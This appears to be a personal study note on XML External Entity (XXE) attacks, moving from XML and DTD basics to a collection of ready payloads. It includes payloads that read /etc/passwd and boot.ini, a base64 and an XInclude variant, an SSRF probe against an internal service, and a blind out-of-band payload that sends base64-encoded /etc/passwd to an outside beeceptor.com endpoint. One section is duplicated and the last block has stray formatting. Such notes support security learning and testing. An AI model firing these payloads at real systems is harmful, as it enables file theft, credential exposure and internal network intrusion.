**First Lets Talk about XML First:**

- First Line contain the meta data
- second line contain the root element Opening
- Third &Fourth are Childrens of root element
- Fifth line is the closing of root element

**Not allowed:**

- Tag name is case sensitive
- `‘”><`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e6ce19c7-1175-4a76-83d9-90dd47a3347a/Untitled.png)

**Entity Let’s say it like a variable** 

**Document Type Definition** (**DTD**) define the **Entities**

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4e1e9de6-33c5-497f-892f-c80adaf6ae68/Untitled.png)

## **ENTITIES TYPES**

- General
- Parameter
- Predefined

## **FEATURESWE CAN USE**

1. Using System Keyword we can uae External Entity
2. XML accept any valid URI 

## XXE TYPES ****

- Inband
- Error Based
- OOB (Out of Band)

## XXE CAN ESCALATE TO

- LFI
- SSRF
- RCE

## **HACKERONE REPORTS**

- [https://hackerone.com/reports/1267743](https://hackerone.com/reports/1267743)
- [https://hackerone.com/reports/823454](https://hackerone.com/reports/823454)

## **Exploiting XXE to retrieve files**

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
------------------------------------------
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

### Classic XXE Base64 encoded

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### XInclude attacks

When you can't modify the **DOCTYPE** element use the **XInclude** to target

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Exploiting XXE to perform SSRF attacks

XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) to target another service on the network.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## Exploiting XXE to perform SSRF attacks

XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) to target another service on the network.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

### Basic Blind XXE

The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

**OR Use Free**

[Beeceptor - Build Rest API in seconds, and showcase to the world](https://beeceptor.com/)

**withcode**

```xml

**<!ENTITY % read SYSTEM "php://filter/convert.base64-encode/resource=file:/ //etc/passwd">
<!ENTITY % test "<!ENTITY &#x25; sendFile SYSTEM 'https://flex@geek.free. beeceptor.com/?x=%read; ">">
%test;
%sendFile;**
```
